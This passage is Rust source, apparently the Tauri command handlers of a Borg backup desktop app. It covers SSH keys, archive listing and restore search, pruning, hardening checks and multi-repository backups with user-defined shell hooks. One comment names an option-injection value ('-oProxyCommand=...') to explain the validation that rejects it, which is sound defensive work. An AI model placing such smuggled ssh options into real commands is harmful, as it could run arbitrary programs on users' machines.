use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use borg_core::archive::ArchiveEntry;
use borg_core::borg::{ArchiveInfo, BorgClient, CancelToken, CheckMode, DiffEntry};
use borg_core::config::RepoConfig;
use borg_core::error::BorgError;
use serde::Serialize;

/// Registry key for the single in-flight backup operation.
const BACKUP_OP: &str = "backup";
/// Registry key for the single in-flight restore operation.
const RESTORE_OP: &str = "restore";
const CHECK_OP: &str = "integrity-check";
const COVERAGE_SCAN_OP: &str = "coverage-scan";
const ARCHIVE_LIST_PREFIX: &str = "archive-list:";
const RESTORE_SEARCH_PREFIX: &str = "restore-search:";

/// Internal name for one-off backups invoked directly from the Backup page.
/// Borg ignores this field, but it shows up in tracing logs.
const MANUAL_PROFILE_NAME: &str = "manual";
use tauri::{Emitter, Manager, State};

use crate::archive_naming::{self, TemplateContext};
use crate::diagnostics::{self, ImportPreview};
use crate::history::{self, BackupEvent, IntegrityEvent};
use crate::keychain;
use crate::profiles::{self, Profile, ProfilesData};

fn lookup_passphrase(repo: &RepoConfig) -> Option<String> {
    keychain::get_passphrase(&repo.ssh_url()).ok().flatten()
}

/// Validate a repo and (on Windows) preflight its reachability before running
/// borg against it — surfacing both as user-facing errors. Use in every command
/// that runs borg against a repo (NOT profile/config CRUD, which must stay
/// savable even when the repo isn't reachable yet). The preflight does a loopback
/// SMB stat, so it runs off the async worker via `spawn_blocking`.
async fn precheck_repo(repo: &RepoConfig) -> Result<(), String> {
    repo.validate().map_err(|e| e.to_string())?;
    let repo = repo.clone();
    tokio::task::spawn_blocking(move || repo.local_repo_preflight())
        .await
        .map_err(|e| e.to_string())?
        .map_err(|e| e.to_string())
}

async fn config_dir(app: &tauri::AppHandle) -> Result<PathBuf, String> {
    app.path().app_config_dir().map_err(|e| e.to_string())
}

async fn read_profiles(app: &tauri::AppHandle) -> Result<ProfilesData, String> {
    let dir = config_dir(app).await?;
    profiles::load(&dir).await
}

async fn write_profiles(app: &tauri::AppHandle, data: &ProfilesData) -> Result<(), String> {
    // Central save-path gate: no profile with option-like (leading `-`) or
    // otherwise invalid fields is ever persisted, regardless of which command
    // mutated it.
    for profile in &data.profiles {
        profile
            .validate()
            .map_err(|e| format!("profile '{}': {e}", profile.name))?;
    }
    let dir = config_dir(app).await?;
    profiles::save(&dir, data).await
}

pub struct AppState {
    pub borg: BorgClient,
    /// Cancellation tokens for in-flight long-running operations, keyed by
    /// [`BACKUP_OP`] / [`RESTORE_OP`]. Used so the UI can stop a running
    /// backup or restore.
    cancels: Mutex<HashMap<String, CancelToken>>,
}

impl AppState {
    pub fn new(borg: BorgClient) -> Self {
        Self {
            borg,
            cancels: Mutex::new(HashMap::new()),
        }
    }

    /// Register a fresh cancel token for `key`. Fails with `busy_msg` if an
    /// operation is already registered under that key, so a second concurrent
    /// backup/restore can't orphan the first one's cancellation. The backend
    /// enforces this invariant rather than trusting the UI to gate it.
    fn try_register_cancel(&self, key: &str, busy_msg: &str) -> Result<CancelToken, String> {
        let mut map = self.cancels.lock().expect("cancel registry poisoned");
        if map.contains_key(key) {
            return Err(busy_msg.to_string());
        }
        let token = CancelToken::new();
        map.insert(key.to_string(), token.clone());
        Ok(token)
    }

    fn unregister_cancel(&self, key: &str) {
        self.cancels
            .lock()
            .expect("cancel registry poisoned")
            .remove(key);
    }

    /// Signal cancellation for `key`. Returns true if an operation was running.
    fn signal_cancel(&self, key: &str) -> bool {
        match self
            .cancels
            .lock()
            .expect("cancel registry poisoned")
            .get(key)
        {
            Some(token) => {
                token.cancel();
                true
            }
            None => false,
        }
    }

    fn cancel_prefix(&self, prefix: &str) -> bool {
        let map = self.cancels.lock().expect("cancel registry poisoned");
        let mut found = false;
        for (key, token) in map.iter() {
            if key.starts_with(prefix) {
                token.cancel();
                found = true;
            }
        }
        found
    }
}

#[tauri::command]
pub async fn get_borg_version(state: State<'_, AppState>) -> Result<String, String> {
    state.borg.version().await.map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn test_ssh_connection(
    host: String,
    port: u16,
    user: String,
    key_path: Option<String>,
) -> Result<(), String> {
    // Option-injection gate: ssh is spawned with direct argv, so a host or
    // user beginning with `-` would be parsed as an ssh flag (e.g.
    // `-oProxyCommand=...`) instead of part of the destination.
    borg_core::config::reject_option_like("ssh_host", &host).map_err(|e| e.to_string())?;
    borg_core::config::reject_option_like("ssh_user", &user).map_err(|e| e.to_string())?;
    let key = key_path.map(PathBuf::from);
    borg_core::ssh::test_connection(&host, port, &user, key.as_deref())
        .await
        .map_err(|e| e.to_string())
}

/// Per-field pre-flight: can we reach the SSH server on this host:port?
#[tauri::command]
pub async fn check_host_reachable(host: String, port: u16) -> Result<(), String> {
    borg_core::ssh::check_reachable(&host, port)
        .await
        .map_err(|e| e.to_string())
}

/// Per-field pre-flight: validate the private-key file and return its public key.
#[tauri::command]
pub async fn validate_ssh_key(key_path: String) -> Result<String, String> {
    borg_core::ssh::validate_key(&PathBuf::from(key_path))
        .await
        .map_err(|e| e.to_string())
}

#[derive(Debug, Serialize)]
pub struct GeneratedSshKey {
    pub private_key_path: String,
    pub public_key: String,
}

/// Generate BorgUI's managed Ed25519 key without requiring Windows OpenSSH.
#[tauri::command]
pub async fn generate_ssh_key(
    app: tauri::AppHandle,
    overwrite: bool,
) -> Result<GeneratedSshKey, String> {
    let key_path = config_dir(&app)
        .await?
        .join("ssh")
        .join("id_ed25519_borgui");
    borg_core::ssh::generate_key(&key_path, overwrite)
        .await
        .map_err(|e| e.to_string())?;
    let public_key = borg_core::ssh::read_public_key(&key_path)
        .await
        .map_err(|e| e.to_string())?
        .trim()
        .to_string();
    Ok(GeneratedSshKey {
        private_key_path: key_path.to_string_lossy().into_owned(),
        public_key,
    })
}

#[tauri::command]
pub async fn get_repo_info(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    repo: RepoConfig,
) -> Result<serde_json::Value, String> {
    precheck_repo(&repo).await?;
    let pass = lookup_passphrase(&repo);
    let value = state
        .borg
        .info(&repo, pass.as_deref())
        .await
        .map_err(|e| e.to_string())?;
    if let Some(stored_size) = value
        .pointer("/cache/stats/total_size")
        .or_else(|| value.pointer("/repository/stats/total_size"))
        .and_then(serde_json::Value::as_u64)
    {
        let data = read_profiles(&app).await?;
        if let Some(profile) = data.active() {
            let destination = if profile.repo.location() == repo.location() {
                Some("primary")
            } else if profile
                .secondary_repo
                .as_ref()
                .is_some_and(|secondary| secondary.location() == repo.location())
            {
                Some("secondary")
            } else {
                None
            };
            if let Some(destination) = destination {
                let dir = config_dir(&app).await?;
                let _ =
                    history::update_latest_stored_size(&dir, &profile.id, destination, stored_size)
                        .await;
            }
        }
    }
    Ok(value)
}

#[tauri::command]
pub async fn storage_forecast(
    app: tauri::AppHandle,
    destination: Option<String>,
) -> Result<crate::forecast::StorageForecast, String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .active()
        .ok_or_else(|| "no active profile".to_string())?;
    let destination = destination.unwrap_or_else(|| "primary".into());
    if destination != "primary" && destination != "secondary" {
        return Err("destination must be primary or secondary".into());
    }
    let repo = if destination == "secondary" {
        profile
            .secondary_repo
            .as_ref()
            .ok_or_else(|| "secondary destination is not configured".to_string())?
    } else {
        &profile.repo
    };
    let dir = config_dir(&app).await?;
    let metrics = history::repository_metrics(&dir, &profile.id, &destination).await?;
    let free_space = repo
        .is_local()
        .then(|| {
            let path = PathBuf::from(&repo.repo_path);
            borg_platform_win::cloud_files::free_space(&path).ok()
        })
        .flatten();
    Ok(crate::forecast::calculate(&metrics, free_space, None))
}

#[tauri::command]
pub async fn save_storage_warnings(
    app: tauri::AppHandle,
    thresholds: crate::profiles::StorageWarningThresholds,
) -> Result<(), String> {
    if thresholds.minimum_free_space_bytes == 0 || thresholds.capacity_warning_days == 0 {
        return Err("storage warning thresholds must be greater than zero".into());
    }
    let mut data = read_profiles(&app).await?;
    data.active_mut()
        .ok_or_else(|| "no active profile".to_string())?
        .storage_warnings = thresholds;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn list_archives(
    state: State<'_, AppState>,
    repo: RepoConfig,
) -> Result<Vec<ArchiveInfo>, String> {
    precheck_repo(&repo).await?;
    let pass = lookup_passphrase(&repo);
    state
        .borg
        .list_archives(&repo, pass.as_deref())
        .await
        .map_err(|e| e.to_string())
}

/// Stream an archive's contents to the frontend in batches over `on_batch`,
/// returning the total number of entries sent. Backs the archive browser:
/// batching keeps the IPC payload (and backend memory) bounded so a very large
/// archive — 100k+ entries — loads progressively instead of as one giant blob.
#[tauri::command]
pub async fn stream_archive_contents(
    state: State<'_, AppState>,
    repo: RepoConfig,
    archive_name: String,
    request_id: String,
    on_batch: tauri::ipc::Channel<Vec<ArchiveEntry>>,
) -> Result<usize, String> {
    precheck_repo(&repo).await?;
    borg_core::config::validate_archive_name(&archive_name).map_err(|e| e.to_string())?;
    if request_id.trim().is_empty() {
        return Err("archive listing request id cannot be empty".into());
    }
    let op_key = format!("{ARCHIVE_LIST_PREFIX}{request_id}");
    let cancel = state.try_register_cancel(
        &op_key,
        "archive contents are already loading for this request",
    )?;
    let send_cancel = cancel.clone();
    let pass = lookup_passphrase(&repo);
    let result = state
        .borg
        .list_contents_streaming(
            &repo,
            &archive_name,
            pass.as_deref(),
            &cancel,
            move |batch| {
                // A send failure means the frontend dropped the channel (browser
                // closed mid-load). Cancel the borg process even if the explicit
                // cancel_archive_listing command is lost to a reload/close race.
                if on_batch.send(batch).is_err() {
                    send_cancel.cancel();
                }
            },
        )
        .await;
    state.unregister_cancel(&op_key);
    result.map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn cancel_archive_listing(
    state: State<'_, AppState>,
    request_id: String,
) -> Result<bool, String> {
    if request_id.trim().is_empty() {
        return Ok(false);
    }
    Ok(state.signal_cancel(&format!("{ARCHIVE_LIST_PREFIX}{request_id}")))
}

#[derive(Debug, Serialize)]
pub struct RestoreSearchMatch {
    pub archive_name: String,
    pub archive_start: String,
    pub entry: ArchiveEntry,
}

#[derive(Debug, Serialize)]
pub struct RestoreSearchBatch {
    pub matches: Vec<RestoreSearchMatch>,
    pub archives_scanned: usize,
}

#[tauri::command]
pub async fn search_restore_files(
    state: State<'_, AppState>,
    repo: RepoConfig,
    query: String,
    request_id: String,
    on_batch: tauri::ipc::Channel<RestoreSearchBatch>,
) -> Result<usize, String> {
    precheck_repo(&repo).await?;
    let query = query.trim().to_lowercase();
    if query.is_empty() {
        return Err("restore search query cannot be empty".into());
    }
    if request_id.trim().is_empty() {
        return Err("restore search request id cannot be empty".into());
    }
    state.cancel_prefix(RESTORE_SEARCH_PREFIX);
    let op_key = format!("{RESTORE_SEARCH_PREFIX}{request_id}");
    let cancel =
        state.try_register_cancel(&op_key, "restore search request id is already active")?;
    let pass = lookup_passphrase(&repo);
    let archives = state
        .borg
        .list_archives(&repo, pass.as_deref())
        .await
        .map_err(|e| e.to_string())?;
    let mut total = 0usize;
    for (archive_index, archive) in archives.into_iter().rev().enumerate() {
        if cancel.is_cancelled() {
            state.unregister_cancel(&op_key);
            return Err("operation cancelled".into());
        }
        let archive_name = archive.name.clone();
        let archive_start = archive.start.clone();
        let query = query.clone();
        let send_cancel = cancel.clone();
        let result = state
            .borg
            .list_contents_streaming(&repo, &archive.name, pass.as_deref(), &cancel, |entries| {
                let matches: Vec<_> = entries
                    .into_iter()
                    .filter(|entry| entry.path.to_lowercase().contains(&query))
                    .map(|entry| RestoreSearchMatch {
                        archive_name: archive_name.clone(),
                        archive_start: archive_start.clone(),
                        entry,
                    })
                    .collect();
                if !matches.is_empty()
                    && on_batch
                        .send(RestoreSearchBatch {
                            matches,
                            archives_scanned: archive_index + 1,
                        })
                        .is_err()
                {
                    send_cancel.cancel();
                }
            })
            .await;
        match result {
            Ok(_) => {}
            Err(error) => {
                state.unregister_cancel(&op_key);
                return Err(error.to_string());
            }
        }
        total += 1;
    }
    state.unregister_cancel(&op_key);
    Ok(total)
}

#[tauri::command]
pub fn cancel_restore_search(state: State<'_, AppState>) -> bool {
    state.cancel_prefix(RESTORE_SEARCH_PREFIX)
}

#[derive(Debug, Serialize)]
pub struct RestoreConflict {
    pub path: String,
    pub exists: bool,
}

#[tauri::command]
pub async fn preview_restore_conflicts(
    destination: String,
    paths: Vec<String>,
) -> Result<Vec<RestoreConflict>, String> {
    let destination = PathBuf::from(destination);
    if !destination.is_dir() {
        return Err("restore destination does not exist".into());
    }
    let canonical_destination = destination.canonicalize().map_err(|e| e.to_string())?;
    tokio::task::spawn_blocking(move || {
        paths
            .into_iter()
            .map(|path| {
                borg_core::archive::validate_restore_path(&path)?;
                let relative = PathBuf::from(&path);
                Ok(RestoreConflict {
                    exists: canonical_destination.join(&relative).exists(),
                    path,
                })
            })
            .collect()
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
pub async fn load_retention_config(
    app: tauri::AppHandle,
) -> Result<Option<borg_core::config::RetentionConfig>, String> {
    let data = read_profiles(&app).await?;
    Ok(data.active().and_then(|p| p.retention.clone()))
}

#[tauri::command]
pub async fn save_retention_config(
    app: tauri::AppHandle,
    config: borg_core::config::RetentionConfig,
) -> Result<(), String> {
    config.validate().map_err(|e| e.to_string())?;
    let mut data = read_profiles(&app).await?;
    let profile = data
        .active_mut()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?;
    profile.retention = Some(config);
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn prune_repo(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    repo: RepoConfig,
    retention: borg_core::config::RetentionConfig,
) -> Result<Vec<String>, String> {
    precheck_repo(&repo).await?;
    retention.validate().map_err(|e| e.to_string())?;
    // Pruning is always scoped to the owning profile's archives (shared
    // repositories hold other machines' backups), so resolve the profile the
    // UI is pruning for and refuse rather than fall back to an unscoped prune.
    let data = read_profiles(&app).await?;
    let active = data
        .active()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?;
    let matches_active = repo.location() == active.repo.location()
        || active
            .secondary_repo
            .as_ref()
            .is_some_and(|secondary| repo.location() == secondary.location());
    if !matches_active {
        return Err("active profile changed; reload the settings page".into());
    }
    let pass = lookup_passphrase(&repo);
    crate::pruning::prune_scoped(
        &state.borg,
        &repo,
        &retention,
        pass.as_deref(),
        active.archive_template.as_deref(),
        &active.name,
    )
    .await
    .map(|outcome| outcome.warnings)
    .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn init_repo(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    repo: RepoConfig,
    encryption: String,
    passphrase: Option<String>,
) -> Result<(), String> {
    precheck_repo(&repo).await?;
    borg_core::config::validate_encryption_mode(&encryption).map_err(|e| e.to_string())?;

    let needs_pass = encryption != "none"
        && encryption != "authenticated"
        && encryption != "authenticated-blake2";
    if needs_pass && passphrase.as_deref().unwrap_or("").is_empty() {
        return Err("passphrase required for this encryption mode".into());
    }

    state
        .borg
        .init_repo(&repo, &encryption, passphrase.as_deref())
        .await
        .map_err(|e| e.to_string())?;

    if let Some(pass) = passphrase.as_deref() {
        keychain::set_passphrase(&repo.ssh_url(), pass)?;
    }

    let mut data = read_profiles(&app).await?;
    if let Some(profile) = data
        .profiles
        .iter_mut()
        .find(|profile| profile.repo.location() == repo.location())
    {
        profile.recovery.encrypted_repository = needs_pass;
        let profile_id = profile.id.clone();
        write_profiles(&app, &data).await?;
        if needs_pass {
            let dir = config_dir(&app).await?;
            history::append_readiness_event(
                &dir,
                history::ReadinessEvent {
                    timestamp: chrono::Utc::now().to_rfc3339(),
                    profile_id,
                    kind: "passphrase".into(),
                    outcome: "success".into(),
                },
            )
            .await?;
        }
    }

    Ok(())
}

#[tauri::command]
pub async fn recovery_readiness(
    app: tauri::AppHandle,
) -> Result<crate::readiness::RecoveryReadiness, String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .active()
        .ok_or_else(|| "no active profile".to_string())?;
    let dir = config_dir(&app).await?;
    let key_export = history::latest_readiness_event(&dir, &profile.id, "key_export").await?;
    let rotation =
        history::latest_readiness_event(&dir, &profile.id, "passphrase_rotation").await?;
    let integrity = history::latest_integrity(&dir, &profile.id).await?;
    let drill = history::latest_restore_drill(&dir, &profile.id).await?;
    let passphrase_available = keychain::get_passphrase(&profile.repo.ssh_url())
        .ok()
        .flatten()
        .is_some();
    Ok(crate::readiness::evaluate(
        profile.recovery.encrypted_repository,
        passphrase_available,
        key_export.as_ref(),
        rotation.as_ref(),
        integrity.as_ref(),
        drill.as_ref(),
        chrono::Utc::now(),
    ))
}

#[tauri::command]
pub async fn delete_archive(
    state: State<'_, AppState>,
    repo: RepoConfig,
    archive_name: String,
) -> Result<(), String> {
    precheck_repo(&repo).await?;
    borg_core::config::validate_archive_name(&archive_name).map_err(|e| e.to_string())?;
    let pass = lookup_passphrase(&repo);
    state
        .borg
        .delete_archive(&repo, &archive_name, pass.as_deref())
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn diff_archives(
    state: State<'_, AppState>,
    repo: RepoConfig,
    archive_a: String,
    archive_b: String,
) -> Result<Vec<DiffEntry>, String> {
    precheck_repo(&repo).await?;
    borg_core::config::validate_archive_name(&archive_a).map_err(|e| e.to_string())?;
    borg_core::config::validate_archive_name(&archive_b).map_err(|e| e.to_string())?;
    if archive_a == archive_b {
        return Err("choose two different archives to compare".into());
    }
    let pass = lookup_passphrase(&repo);
    state
        .borg
        .diff_archives(&repo, &archive_a, &archive_b, pass.as_deref())
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn compact_repo(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    repo: RepoConfig,
) -> Result<String, String> {
    precheck_repo(&repo).await?;
    if read_profiles(&app).await?.active().is_some_and(|profile| {
        profile.repo.location() == repo.location() && profile.hardening.append_only_declared
    }) {
        return Err(
            "compact is disabled for declared append-only backup access; run physical cleanup with trusted server-side maintenance credentials".into(),
        );
    }
    let pass = lookup_passphrase(&repo);
    state
        .borg
        .compact(&repo, pass.as_deref())
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn generate_append_only_instructions(
    app: tauri::AppHandle,
) -> Result<crate::hardening::AuthorizedKeysInstructions, String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .active()
        .ok_or_else(|| "no active profile".to_string())?;
    if profile.repo.is_local() {
        return Err("append-only SSH instructions apply only to SSH repositories".into());
    }
    let key_path = profile
        .repo
        .ssh_key_path
        .as_deref()
        .ok_or_else(|| "configure or generate the backup SSH key first".to_string())?;
    let public_key = borg_core::ssh::read_public_key(key_path)
        .await
        .map_err(|error| error.to_string())?;
    crate::hardening::generate_authorized_keys_line(&public_key, &profile.repo.repo_path)
}

#[tauri::command]
pub async fn save_hardening_posture(
    app: tauri::AppHandle,
    posture: profiles::HardeningPosture,
) -> Result<(), String> {
    let mut data = read_profiles(&app).await?;
    let profile = data
        .active_mut()
        .ok_or_else(|| "no active profile".to_string())?;
    if profile.repo.is_local() && (posture.append_only_declared || posture.restricted_ssh_declared)
    {
        return Err("SSH hardening declarations do not apply to local repositories".into());
    }
    profile.hardening = posture;
    write_profiles(&app, &data).await
}

#[derive(Debug, Serialize)]
pub struct HardeningCheck {
    pub id: &'static str,
    pub label: &'static str,
    pub complete: bool,
}

#[tauri::command]
pub async fn hardening_checklist(app: tauri::AppHandle) -> Result<Vec<HardeningCheck>, String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .active()
        .ok_or_else(|| "no active profile".to_string())?;
    let dir = config_dir(&app).await?;
    let integrity = history::latest_integrity(&dir, &profile.id).await?;
    let drill = history::latest_restore_drill(&dir, &profile.id).await?;
    Ok(vec![
        HardeningCheck {
            id: "encryption",
            label: "Repository encryption declared",
            complete: profile.hardening.encrypted_repository_declared,
        },
        HardeningCheck {
            id: "recovery_key",
            label: "Encrypted recovery key exported",
            complete: profile.hardening.recovery_key_exported,
        },
        HardeningCheck {
            id: "restricted_ssh",
            label: "Restricted append-only SSH access declared",
            complete: profile.repo.is_local()
                || (profile.hardening.restricted_ssh_declared
                    && profile.hardening.append_only_declared),
        },
        HardeningCheck {
            id: "integrity",
            label: "Latest integrity check succeeded",
            complete: integrity.is_some_and(|event| event.outcome == "success"),
        },
        HardeningCheck {
            id: "restore_drill",
            label: "Latest restore drill succeeded",
            complete: drill.is_some_and(|event| event.outcome == "success"),
        },
        HardeningCheck {
            id: "server_maintenance",
            label: "Server maintenance and recovery documented",
            complete: profile.repo.is_local() || profile.hardening.server_maintenance_documented,
        },
    ])
}

#[tauri::command]
pub async fn protection_health(
    app: tauri::AppHandle,
) -> Result<crate::health::ProtectionHealth, String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .active()
        .cloned()
        .ok_or_else(|| "no active profile".to_string())?;
    let dir = config_dir(&app).await?;
    let events = history::load(&dir).await?;
    let scheduled = history::latest_scheduled_attempt(&dir, &profile.id).await?;
    let integrity = history::latest_integrity(&dir, &profile.id).await?;
    let drill = history::latest_restore_drill(&dir, &profile.id).await?;
    let primary_attempt = history::latest_destination_attempt(&dir, &profile.id, "primary").await?;
    let secondary_attempt =
        history::latest_destination_attempt(&dir, &profile.id, "secondary").await?;
    let unavailable_sources = tokio::task::spawn_blocking({
        let paths = profile.backup_selection.source_paths.clone();
        move || {
            paths
                .iter()
                .filter(|path| !PathBuf::from(path).is_dir())
                .count() as u32
        }
    })
    .await
    .map_err(|error| error.to_string())?;
    let repository_reachable = if profile.repo.is_local() {
        PathBuf::from(&profile.repo.repo_path).is_dir()
    } else {
        precheck_repo(&profile.repo).await.is_ok()
    };
    let grace_seconds = match profile.schedule.as_ref().map(|schedule| &schedule.schedule) {
        Some(borg_platform_win::scheduler::Schedule::Hourly) => 90 * 60,
        Some(borg_platform_win::scheduler::Schedule::Daily { .. }) => 36 * 60 * 60,
        None => u64::MAX,
    };
    let missed = scheduled.as_ref().is_some_and(|attempt| {
        crate::scheduled::is_missed(&attempt.timestamp, grace_seconds, chrono::Utc::now())
    });
    Ok(crate::health::aggregate(crate::health::HealthInputs {
        profile: &profile,
        events: &events,
        scheduled: scheduled.as_ref(),
        missed,
        unavailable_sources,
        repository_reachable,
        integrity: integrity.as_ref(),
        drill: drill.as_ref(),
        primary_attempt: primary_attempt.as_ref(),
        secondary_attempt: secondary_attempt.as_ref(),
        passphrase_available: keychain::get_passphrase(&profile.repo.ssh_url())
            .ok()
            .flatten()
            .is_some(),
        now: chrono::Utc::now(),
    }))
}

#[tauri::command]
#[allow(clippy::too_many_arguments)]
pub async fn create_backup(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    repo: RepoConfig,
    archive_name: String,
    pre_backup: Option<String>,
    post_backup: Option<String>,
) -> Result<LogicalBackupResult, String> {
    precheck_repo(&repo).await?;
    let compression = borg_core::config::Compression::default();
    compression.validate().map_err(|e| e.to_string())?;
    borg_core::config::validate_archive_name(&archive_name).map_err(|e| e.to_string())?;
    let data = read_profiles(&app).await?;
    let active = data
        .active()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?;
    let mut selection = active.backup_selection.clone();
    let resource_policy = active.resource_policy.clone();
    let profile_id = active.id.clone();
    let profile_name = active.name.clone();
    let archive_template = active.archive_template.clone();
    let retention = active.retention.clone();
    if repo.location() != active.repo.location() {
        return Err("active primary repository changed; reload the backup page".into());
    }
    let mut destinations = vec![("primary", repo.clone())];
    if let Some(secondary) = active.secondary_repo.clone() {
        if secondary.location() == repo.location() {
            return Err("secondary repository must differ from primary".into());
        }
        secondary.validate().map_err(|error| error.to_string())?;
        destinations.push(("secondary", secondary));
    }
    borg_core::config::validate_source_paths(&selection.source_paths).map_err(|e| e.to_string())?;
    borg_core::config::validate_exclude_patterns(&selection.excludes).map_err(|e| e.to_string())?;

    // Pre/post-backup hooks run the user's own shell commands; `$repo_url` and
    // `$archive_name` expand to already-validated values.
    let repo_url = repo.location();
    let hook_ctx = borg_core::hooks::HookContext {
        repo_url: &repo_url,
        archive_name: &archive_name,
    };
    let trimmed = |c: Option<String>| c.map(|s| s.trim().to_string()).filter(|s| !s.is_empty());
    let pre_backup = trimmed(pre_backup);
    let post_backup = trimmed(post_backup);

    // A failed pre-backup hook aborts before borg runs: if the prep step (e.g. a
    // DB dump) failed, backing up stale/partial data would be worse than nothing.
    if let Some(cmd) = pre_backup.as_deref() {
        borg_core::hooks::run("pre-backup", cmd, &hook_ctx)
            .await
            .map_err(|e| e.to_string())?;
    }

    let raw_paths: Vec<PathBuf> = selection
        .source_paths
        .into_iter()
        .map(PathBuf::from)
        .collect();

    // Register the cancel slot before taking a snapshot, so a concurrent backup
    // is rejected up front and never leaves a VSS snapshot/junction behind.
    let cancel = state.try_register_cancel(BACKUP_OP, "a backup is already running")?;
    let _sleep_guard =
        borg_platform_win::resource::SleepGuard::acquire(resource_policy.prevent_sleep)?;
    let placeholder_plan =
        crate::placeholders::prepare(&raw_paths, &active.placeholder_policy, &cancel).await?;
    selection.excludes.extend(placeholder_plan.exclusions);

    // VSS (Windows, admin, single-volume): snapshot the source volume and back
    // up from a read-only junction mount so borg stores clean, restorable paths
    // and exclusively-locked files are still captured. Multi-volume, non-admin,
    // or any failure transparently falls back to live-file backup; no-op off
    // Windows. See crates/borg-platform-win/src/vss.rs.
    let vss = borg_platform_win::vss::prepare_snapshot(&raw_paths).await;

    let run_id = format!("manual-{}", chrono::Utc::now().timestamp_millis());
    let dir = config_dir(&app).await?;
    let mut attempts = Vec::new();
    let mut warnings = if placeholder_plan.count > 0 {
        vec![format!(
            "{} cloud placeholders were handled according to policy",
            placeholder_plan.count
        )]
    } else {
        Vec::new()
    };
    let mut cancelled = false;
    for (index, (destination_name, destination)) in destinations.iter().enumerate() {
        if cancel.is_cancelled() {
            cancelled = true;
            for (remaining_name, _) in destinations.iter().skip(index) {
                record_destination_attempt(&dir, &run_id, &profile_id, remaining_name, "skipped")
                    .await;
                attempts.push(DestinationAttemptResult {
                    destination: (*remaining_name).into(),
                    outcome: "skipped".into(),
                    warnings: Vec::new(),
                });
            }
            break;
        }
        if index > 0 && precheck_repo(destination).await.is_err() {
            record_destination_attempt(&dir, &run_id, &profile_id, destination_name, "failure")
                .await;
            attempts.push(DestinationAttemptResult {
                destination: (*destination_name).into(),
                outcome: "failure".into(),
                warnings: Vec::new(),
            });
            continue;
        }
        let pass = lookup_passphrase(destination);
        let backup_profile = borg_core::config::BackupProfile {
            name: MANUAL_PROFILE_NAME.into(),
            source_paths: vss.source_paths.clone(),
            excludes: selection.excludes.clone(),
            compression: compression.clone(),
            repo: destination.clone(),
            upload_limit_kib: resource_policy.upload_limit_kib,
        };
        let progress_app = app.clone();
        let metric_totals = Arc::new(Mutex::new(crate::forecast::MetricTotals::default()));
        let progress_metrics = Arc::clone(&metric_totals);
        let destination_started = std::time::Instant::now();
        let result = state
            .borg
            .create(
                &backup_profile,
                &archive_name,
                vss.cwd.as_deref(),
                pass.as_deref(),
                &cancel,
                move |event| {
                    if let Ok(mut totals) = progress_metrics.lock() {
                        totals.observe(&event);
                    }
                    let _ = progress_app.emit("backup-progress", &event);
                },
            )
            .await;
        match result {
            Ok(outcome) => {
                let totals = metric_totals.lock().map(|value| *value).unwrap_or_default();
                let metric = totals.into_metric(
                    profile_id.clone(),
                    (*destination_name).into(),
                    destination_started.elapsed().as_secs(),
                );
                let _ = history::append_repository_metric(&dir, metric).await;
                let mut destination_warnings = outcome.warnings;
                if let Some(retention) = &retention {
                    match crate::pruning::prune_scoped(
                        &state.borg,
                        destination,
                        retention,
                        pass.as_deref(),
                        archive_template.as_deref(),
                        &profile_name,
                    )
                    .await
                    {
                        Ok(outcome) => destination_warnings.extend(outcome.warnings),
                        Err(_) => destination_warnings
                            .push("retention failed for this destination".into()),
                    }
                }
                record_destination_attempt(&dir, &run_id, &profile_id, destination_name, "success")
                    .await;
                warnings.extend(destination_warnings.clone());
                attempts.push(DestinationAttemptResult {
                    destination: (*destination_name).into(),
                    outcome: "success".into(),
                    warnings: destination_warnings,
                });
            }
            Err(borg_core::error::BorgError::Cancelled) => {
                cancelled = true;
                record_destination_attempt(
                    &dir,
                    &run_id,
                    &profile_id,
                    destination_name,
                    "cancelled",
                )
                .await;
                attempts.push(DestinationAttemptResult {
                    destination: (*destination_name).into(),
                    outcome: "cancelled".into(),
                    warnings: Vec::new(),
                });
            }
            Err(_) => {
                record_destination_attempt(&dir, &run_id, &profile_id, destination_name, "failure")
                    .await;
                attempts.push(DestinationAttemptResult {
                    destination: (*destination_name).into(),
                    outcome: "failure".into(),
                    warnings: Vec::new(),
                });
            }
        }
    }
    state.unregister_cancel(BACKUP_OP);
    // Release the snapshot + junction regardless of how the backup ended.
    vss.release().await;

    if cancelled {
        return Err("operation cancelled".into());
    }
    let successes = attempts
        .iter()
        .filter(|attempt| attempt.outcome == "success")
        .count();
    let outcome = logical_backup_outcome(&attempts);

    // The backup itself succeeded; a failing post-backup hook is reported as a
    // warning rather than turning the whole backup into a failure.
    if successes > 0
        && let Some(cmd) = post_backup.as_deref()
        && let Err(e) = borg_core::hooks::run("post-backup", cmd, &hook_ctx).await
    {
        warnings.push(format!("post-backup command failed: {e}"));
    }

    Ok(LogicalBackupResult {
        outcome: outcome.into(),
        warnings,
        attempts,
    })
}

fn logical_backup_outcome(attempts: &[DestinationAttemptResult]) -> &'static str {
    let successes = attempts
        .iter()
        .filter(|attempt| attempt.outcome == "success")
        .count();
    if successes == attempts.len() {
        "success"
    } else if successes > 0 {
        "partial_success"
    } else {
        "failure"
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct DestinationAttemptResult {
    pub destination: String,
    pub outcome: String,
    pub warnings: Vec<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct LogicalBackupResult {
    pub outcome: String,
    pub warnings: Vec<String>,
